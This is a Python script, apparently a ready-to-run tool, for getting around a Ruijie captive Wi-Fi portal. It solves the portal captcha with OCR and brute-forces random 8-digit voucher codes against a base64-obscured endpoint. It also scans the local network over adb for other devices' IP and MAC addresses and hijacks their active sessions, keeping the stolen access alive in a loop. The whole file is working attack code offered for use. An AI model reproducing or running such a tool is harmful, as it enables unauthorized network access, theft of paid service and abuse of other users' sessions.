#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🕷️ SPIDER-MAN BYPASS DAEMON - SIMPLE
Developer: @Spider_man1245
Run: python bypass.py
"""

import os, sys, re, time, json, base64, random, string, hashlib, uuid
import asyncio, aiohttp, requests, subprocess, logging
from datetime import datetime
from urllib.parse import quote

# ── LOGGING ──
LOG_DIR = os.path.expanduser("~/var/.spider_daemon")
os.makedirs(LOG_DIR, exist_ok=True)
LOG_FILE = os.path.join(LOG_DIR, "bypass.log")
PID_FILE = os.path.join(LOG_DIR, "bypass.pid")

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(message)s',
    handlers=[logging.FileHandler(LOG_FILE), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# ── CONFIG ──
DATA_DIR = os.path.expanduser("~/var/.spider_data")
os.makedirs(DATA_DIR, exist_ok=True)

SESSION_URL_FILE = os.path.join(DATA_DIR, "session_url")
GW_IP_FILE = os.path.join(DATA_DIR, "gw_ip")
ACTIVE_DEVICES_FILE = os.path.join(DATA_DIR, "active_devices.json")

# ── GLOBALS ──
running = True
session_id = None
expiry = 0
device_ip = None

# ── SAVE PID ──
with open(PID_FILE, "w") as f:
    f.write(str(os.getpid()))

# ── RUIJIE API ──

def _o_p():
    return "portal-as.ruijienetworks.com"

def transform_url(url, ip, mac):
    url = re.sub(r'ip=[^&]*', f'ip={ip}', url)
    url = re.sub(r'mac=[^&]*', f'mac={quote(mac, safe="")}', url)
    return url

async def get_sid(session, url):
    try:
        async with session.get(url, allow_redirects=True, timeout=10, ssl=False) as resp:
            text = str(resp.url)
            match = re.search(r"[?&]sessionId=([a-f0-9]+)", text, re.I)
            if match:
                return match.group(1)
            return None
    except:
        return None

async def get_captcha(session, sid):
    try:
        async with session.get(
            f'https://portal-as.ruijienetworks.com/api/auth/captcha/image?sessionId={sid}&_t={time.time()}',
            timeout=5, ssl=False
        ) as resp:
            if resp.status == 200:
                return await resp.read()
    except:
        pass
    return None

def solve_captcha(img):
    try:
        import cv2, numpy as np, ddddocr
        nparr = np.frombuffer(img, np.uint8)
        img2 = cv2.imdecode(nparr, cv2.IMREAD_GRAYSCALE)
        if img2 is None:
            return None
        _, img2 = cv2.threshold(img2, 127, 255, cv2.THRESH_BINARY)
        _, buf = cv2.imencode('.png', img2)
        ocr = ddddocr.DdddOcr(show_ad=False)
        return ocr.classification(buf.tobytes()).upper()
    except:
        return None

async def verify_captcha(session, sid, code):
    try:
        async with session.post(
            'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
            json={'sessionId': sid, 'authCode': code},
            timeout=5, ssl=False
        ) as resp:
            data = await resp.json()
            return data.get("success", False)
    except:
        return False

async def submit_voucher(session, sid, voucher, captcha):
    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()
    try:
        async with session.post(
            post_url,
            json={"accessCode": voucher, "sessionId": sid, "apiVersion": 1, "authCode": captcha},
            timeout=10, ssl=False
        ) as resp:
            text = await resp.text()
            return 'logonUrl' in text
    except:
        return False

async def keep_alive(session, gw_ip, sid):
    phone = ''.join(random.choices(string.digits, k=6))
    try:
        async with session.post(
            f"http://{gw_ip}:2060/wifidog/auth",
            params={"token": sid, "phoneNumber": phone},
            timeout=5, ssl=False
        ) as resp:
            return resp.status in (200, 302, 303, 307)
    except:
        return False

async def check_internet(session):
    try:
        async with session.get("http://clients3.google.com/generate_204", timeout=5, ssl=False) as resp:
            return resp.status == 204
    except:
        return False

# ── MAIN LOOP ──

async def main_loop():
    global running, session_id, expiry, device_ip
    
    logger.info("🕷️ Spider Bypass Daemon Started")
    
    # Load config
    try:
        with open(SESSION_URL_FILE) as f:
            portal_url = f.read().strip()
        with open(GW_IP_FILE) as f:
            gw_ip = f.read().strip()
        with open(ACTIVE_DEVICES_FILE) as f:
            devices = json.load(f).get("devices", [])
    except:
        logger.error("❌ Run setup first!")
        logger.error("  python bypass.py --setup")
        return
    
    if not devices:
        logger.error("❌ No devices! Run --scan and --test")
        return
    
    device_ip, device_mac = devices[0]
    logger.info(f"📡 Device: {device_ip}")
    
    while running:
        try:
            async with aiohttp.ClientSession() as session:
                # Get session
                url = transform_url(portal_url, device_ip, device_mac)
                sid = await get_sid(session, url)
                if not sid:
                    logger.warning("⚠️ No session, retrying...")
                    await asyncio.sleep(10)
                    continue
                
                # Captcha + Voucher
                success = False
                for _ in range(5):
                    img = await get_captcha(session, sid)
                    if not img:
                        continue
                    captcha = await asyncio.to_thread(solve_captcha, img)
                    if not captcha:
                        continue
                    if not await verify_captcha(session, sid, captcha):
                        continue
                    
                    for _ in range(10):
                        voucher = ''.join(random.choices(string.digits, k=8))
                        if await submit_voucher(session, sid, voucher, captcha):
                            if await keep_alive(session, gw_ip, sid) and await check_internet(session):
                                session_id = sid
                                expiry = time.time() + 210
                                logger.info(f"✅ BYPASS ACTIVE! Session: {sid[:8]}...")
                                success = True
                                break
                    if success:
                        break
                
                if not success:
                    logger.warning("⚠️ Failed, retrying...")
                    await asyncio.sleep(30)
                    continue
                
                # Keep alive
                last_keep = time.time()
                while running:
                    now = time.time()
                    
                    if now >= expiry:
                        logger.warning("🔄 Session expired")
                        break
                    
                    if now - last_keep >= 20:
                        if not await keep_alive(session, gw_ip, session_id):
                            logger.warning("🔄 Keep-alive failed")
                            break
                        last_keep = now
                    
                    if not await check_internet(session):
                        logger.warning("⚠️ Internet lost")
                        break
                    
                    rem = int(expiry - now)
                    if rem % 30 == 0:
                        logger.info(f"🕷️ Active | {rem}s remaining")
                    
                    await asyncio.sleep(5)
                
                logger.warning("⏹️ Session ended, reconnecting...")
                
        except Exception as e:
            logger.error(f"❌ Error: {e}")
            await asyncio.sleep(10)

# ── SETUP FUNCTIONS ──

def setup():
    print("\n🕷️ SETUP MODE")
    try:
        localhost = requests.get("http://192.168.0.1", timeout=10).url
        ip = re.search(r'gw_address=(.*?)&', localhost).group(1)
        headers = {'authority': _o_p(), 'accept': '*/*', 'user-agent': 'Mozilla/5.0'}
        req = requests.get(localhost, headers=headers).text
        session_url = "https://portal-as.ruijienetworks.com" + re.search(r"href='(.*?)'</script>", req).group(1)
        with open(SESSION_URL_FILE, "w") as f:
            f.write(session_url)
        with open(GW_IP_FILE, "w") as f:
            f.write(ip)
        print(f"✅ Setup complete! Gateway: {ip}")
    except Exception as e:
        print(f"❌ Failed: {e}")

def scan():
    print("\n🕷️ SCANNING...")
    all_devs = []
    for _ in range(2):
        for i in range(1, 255):
            try:
                subprocess.run(f"adb shell ping -c 1 -W 2 192.168.110.{i}", shell=True, timeout=2, 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass
        time.sleep(3)
        try:
            out = subprocess.check_output("adb shell ip neigh show", shell=True).decode()
            for line in out.split('\n'):
                if 'lladdr' in line:
                    parts = line.split()
                    ip = parts[0]
                    mac = parts[parts.index('lladdr') + 1]
                    if not ip.startswith('192.168.110.1'):
                        all_devs.append((ip, mac))
        except:
            pass
        if len(all_devs) >= 5:
            break
    if all_devs:
        with open(os.path.join(DATA_DIR, "raw_devices.json"), "w") as f:
            json.dump({"devices": all_devs}, f)
        print(f"✅ Found {len(all_devs)} devices")
        for ip, mac in all_devs:
            print(f"  {ip} | {mac}")
    else:
        print("❌ No devices")

async def test_async():
    print("\n🕷️ TESTING ACTIVE...")
    try:
        with open(SESSION_URL_FILE) as f:
            portal_url = f.read().strip()
        with open(GW_IP_FILE) as f:
            gw_ip = f.read().strip()
        with open(os.path.join(DATA_DIR, "raw_devices.json")) as f:
            raw = json.load(f).get("devices", [])
    except:
        print("❌ Run setup and scan first!")
        return
    
    active = []
    async with aiohttp.ClientSession() as session:
        for ip, mac in raw:
            url = transform_url(portal_url, ip, mac)
            sid = await get_sid(session, url, timeout=5)
            if sid and await keep_alive(session, gw_ip, sid) and await check_internet(session):
                active.append((ip, mac))
                print(f"✅ Active: {ip}")
            await asyncio.sleep(0.3)
    
    if active:
        with open(ACTIVE_DEVICES_FILE, "w") as f:
            json.dump({"devices": active}, f)
        print(f"✅ {len(active)} active devices")
    else:
        print("❌ No active devices")

def test():
    asyncio.run(test_async())

def stop():
    global running
    running = False
    if os.path.exists(PID_FILE):
        os.remove(PID_FILE)
    print("⏹️ Stopping...")

# ── MAIN ──

if __name__ == '__main__':
    if len(sys.argv) > 1:
        arg = sys.argv[1]
        if arg == "--setup":
            setup()
        elif arg == "--scan":
            scan()
        elif arg == "--test":
            test()
        elif arg == "--stop":
            stop()
        elif arg == "--help":
            print("""
🕷️ Spider Bypass Commands:
  --setup   Setup WiFi
  --scan    Scan devices
  --test    Test active devices
  --stop    Stop daemon
  --help    This help
            """)
        sys.exit(0)
    
    try:
        asyncio.run(main_loop())
    except KeyboardInterrupt:
        running = False
        if os.path.exists(PID_FILE):
            os.remove(PID_FILE)
        print("\n👋 Goodbye!")
